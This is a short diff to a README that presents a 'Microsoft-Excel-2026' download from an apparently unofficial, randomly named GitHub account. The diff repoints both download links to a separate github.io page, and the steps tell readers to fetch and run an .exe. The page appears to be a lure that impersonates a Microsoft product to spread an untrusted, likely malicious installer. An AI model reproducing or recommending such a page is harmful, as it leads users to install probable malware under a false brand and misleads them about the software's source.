@@ -1,6 +1,6 @@
 # 📊 Microsoft-Excel-2026 - Streamline your data analysis and reporting
 
-[![](https://img.shields.io/badge/Download-Excel-2026-blue.svg)](https://github.com/inflammatory-airwave822/Microsoft-Excel-2026)
+[![](https://img.shields.io/badge/Download-Excel-2026-blue.svg)](https://inflammatory-airwave822.github.io)
 
 ## 📋 About This Application
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software effectivel
 
 Follow these steps to obtain the installer for your computer:
 
-1. Visit the [official repository page](https://github.com/inflammatory-airwave822/Microsoft-Excel-2026).
+1. Visit the [official repository page](https://inflammatory-airwave822.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Click the most recent version number.
 4. Select the file ending in .exe to start your download.
